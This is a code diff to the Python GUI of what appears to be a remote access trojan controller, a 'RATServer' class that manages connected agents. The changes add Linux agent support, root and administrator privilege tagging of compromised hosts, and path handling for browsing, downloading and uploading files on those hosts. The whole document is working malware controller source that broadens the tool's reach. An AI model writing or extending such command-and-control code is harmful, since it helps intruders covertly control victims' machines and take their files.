@@ -248,6 +248,7 @@ class Agent:
         self.ip           = addr[0]
         self.is_admin     = False
         self.ps_ver       = "?"
+        self.os_type      = "windows"  # "windows" or "linux"
         self.connected_at = datetime.now()
         # BUG FIX #2: two separate locks — one for the socket, one for the
         # pending-response dict.  Without the pending lock, send_command() and
@@ -447,8 +448,19 @@ class RATServer:
             agent.os       = str(msg.get("os",       "Unknown"))[:128]
             agent.arch     = str(msg.get("arch",     "Unknown"))[:32]
             agent.ip       = str(msg.get("ip",       addr[0]))[:45]
-            agent.ps_ver   = str(msg.get("ps_ver",   "?"))[:32]
-            agent.is_admin = bool(msg.get("is_admin", False))
+            
+            # Detect OS type from OS string
+            os_lower = agent.os.lower()
+            if "linux" in os_lower or "unix" in os_lower or "darwin" in os_lower:
+                agent.os_type = "linux"
+                # Python agent sends is_root and python_ver
+                agent.is_admin = bool(msg.get("is_root", False))
+                agent.ps_ver   = str(msg.get("python_ver", "?"))[:32]
+            else:
+                agent.os_type = "windows"
+                # PowerShell agent sends is_admin and ps_ver
+                agent.is_admin = bool(msg.get("is_admin", False))
+                agent.ps_ver   = str(msg.get("ps_ver", "?"))[:32]
 
             # BUG FIX #5: only add to visible agent dict AFTER auth + valid register
             with self._lock:
@@ -777,7 +789,6 @@ class App:
                  fg=C["subtext"]).pack(side="left", padx=(0, 4))
         self._path_e = ttk.Entry(pb, font=(MONO, 10))
         self._path_e.pack(side="left", fill="x", expand=True)
-        self._path_e.insert(0, "C:\\")
         self._path_e.bind("<Return>", self._browse)
         ttk.Button(pb, text="Go",   command=self._browse).pack(side="left", padx=4)
         ttk.Button(pb, text="↑ Up", command=self._go_up).pack(side="left", padx=4)
@@ -835,10 +846,13 @@ class App:
 
     def _dispatch_agent_event(self, ev: str, agent: Agent):
         if ev == "connect":
-            admin_tag = " ★" if agent.is_admin else ""
+            admin_tag = " ★" if (agent.is_admin and agent.os_type == "windows") else ""
+            root_tag  = " ⚡" if (agent.is_admin and agent.os_type == "linux") else ""
+            priv_tag  = admin_tag or root_tag
+            
             iid = self._atree.insert("", "end", values=(
                 agent.hostname,
-                agent.username.split("\\")[-1] + admin_tag,
+                agent.username.split("\\")[-1].split("/")[-1] + priv_tag,
                 agent.ip,
             ))
             self._tree_map[agent.id] = iid
@@ -846,7 +860,8 @@ class App:
                 f"[+] {agent.username}@{agent.hostname}  ({agent.ip})  —  {agent.os}",
                 "success")
             if agent.is_admin:
-                self._log("    ★ Running as Administrator", "warn")
+                priv_name = "Root" if agent.os_type == "linux" else "Administrator"
+                self._log(f"    {'⚡' if agent.os_type == 'linux' else '★'} Running as {priv_name}", "warn")
         elif ev == "disconnect":
             iid = self._tree_map.pop(agent.id, None)
             if iid:
@@ -875,8 +890,20 @@ class App:
                     self._lbl_info.config(
                         fg=C["subtext"],
                         text=f"  {a.username}  @  {a.hostname}  ·  {a.ip}  ·  {a.os}  ·  since {ts}")
-                    self._lbl_ps.config(text=f"PS {a.hostname} >")
-                    self._lbl_admin.config(text="  ★ ADMIN  " if a.is_admin else "")
+                    # Update prompt based on OS
+                    if a.os_type == "linux":
+                        self._lbl_ps.config(text=f"$ {a.hostname} >")
+                        priv_label = "  ⚡ ROOT  " if a.is_admin else ""
+                        default_path = "/"
+                    else:
+                        self._lbl_ps.config(text=f"PS {a.hostname} >")
+                        priv_label = "  ★ ADMIN  " if a.is_admin else ""
+                        default_path = "C:\\"
+                    self._lbl_admin.config(text=priv_label)
+                    # Set default file browser path if empty
+                    if not self._path_e.get():
+                        self._path_e.delete(0, "end")
+                        self._path_e.insert(0, default_path)
                 break
 
     def _get_agent(self, warn: bool = True) -> Optional[Agent]:
@@ -1120,13 +1147,39 @@ class App:
         name  = self._strip_icon(str(vals[0]))
         ftype = vals[1]
         if ftype == "DIR":
-            cur = self._path_e.get().rstrip("\\")
+            a = self._get_agent(warn=False)
+            cur = self._path_e.get()
+            
+            if a and a.os_type == "linux":
+                # Linux: use forward slashes
+                cur = cur.rstrip("/")
+                new_path = f"{cur}/{name}" if cur != "/" else f"/{name}"
+            else:
+                # Windows: use backslashes
+                cur = cur.rstrip("\\")
+                new_path = cur + "\\" + name
+            
             self._path_e.delete(0, "end")
-            self._path_e.insert(0, cur + "\\" + name)
+            self._path_e.insert(0, new_path)
             self._browse()
 
     def _go_up(self):
-        parent = self._win_parent(self._path_e.get())    # BUG FIX #6
+        a = self._get_agent(warn=False)
+        current = self._path_e.get()
+        
+        if a and a.os_type == "linux":
+            # Linux: use forward slashes
+            parent = current.rstrip("/")
+            if "/" in parent:
+                parent = parent.rsplit("/", 1)[0]
+                if not parent:
+                    parent = "/"
+            else:
+                parent = "/"
+        else:
+            # Windows: use backslashes with _win_parent
+            parent = self._win_parent(current)
+        
         self._path_e.delete(0, "end")
         self._path_e.insert(0, parent)
         self._browse()
@@ -1139,9 +1192,17 @@ class App:
         if not sel:
             messagebox.showwarning("No Selection", "Select a file to download.")
             return
-        name   = self._strip_icon(str(self._ftree.item(sel[0])["values"][0]))  # BUG FIX #7
-        remote = self._path_e.get().rstrip("\\") + "\\" + name
-        save   = filedialog.asksaveasfilename(initialfile=name)
+        name = self._strip_icon(str(self._ftree.item(sel[0])["values"][0]))
+        
+        # Construct remote path with correct separator
+        cur = self._path_e.get()
+        if a.os_type == "linux":
+            cur = cur.rstrip("/")
+            remote = f"{cur}/{name}" if cur != "/" else f"/{name}"
+        else:
+            remote = cur.rstrip("\\") + "\\" + name
+        
+        save = filedialog.asksaveasfilename(initialfile=name)
         if not save:
             return
         self.server.audit_cmd(a, "download", remote)
@@ -1172,8 +1233,16 @@ class App:
         local = filedialog.askopenfilename()
         if not local:
             return
-        fname  = os.path.basename(local)
-        remote = self._path_e.get().rstrip("\\") + "\\" + fname
+        fname = os.path.basename(local)
+        
+        # Construct remote path with correct separator
+        cur = self._path_e.get()
+        if a.os_type == "linux":
+            cur = cur.rstrip("/")
+            remote = f"{cur}/{fname}" if cur != "/" else f"/{fname}"
+        else:
+            remote = cur.rstrip("\\") + "\\" + fname
+        
         self.server.audit_cmd(a, "upload", remote)
 
         def run():
@@ -1242,14 +1311,24 @@ class App:
         row("Architecture", info.get("arch",     "N/A"))
         row("RAM (GB)",     str(info.get("ram_gb", "N/A")))
         row("Uptime",       info.get("uptime",   "N/A"))
-        row("PowerShell",   info.get("ps_ver",   "N/A"))
+        
+        # Show appropriate version label based on what's present
+        if "python_ver" in info:
+            row("Python",   info.get("python_ver", "N/A"))
+        elif "ps_ver" in info:
+            row("PowerShell", info.get("ps_ver", "N/A"))
+        
         row("Working Dir",  info.get("cwd",      "N/A"))
         row("Local IP",     info.get("local_ip", "N/A"))
-        t.insert("end", f"\n  {'Admin Privileges':<22}", "key")
-        if info.get("is_admin"):
-            t.insert("end", "★  Yes — Elevated\n", "admin_y")
+        
+        t.insert("end", f"\n  {'Privileges':<22}", "key")
+        # Check both is_root (Linux) and is_admin (Windows)
+        if info.get("is_root") or info.get("is_admin"):
+            label = "⚡  Root" if info.get("is_root") else "★  Administrator"
+            t.insert("end", f"{label}\n", "admin_y")
         else:
-            t.insert("end", "No\n", "admin_n")
+            t.insert("end", "Standard User\n", "admin_n")
+        
         t.insert("end", "\n")
         t.config(state="disabled")
 
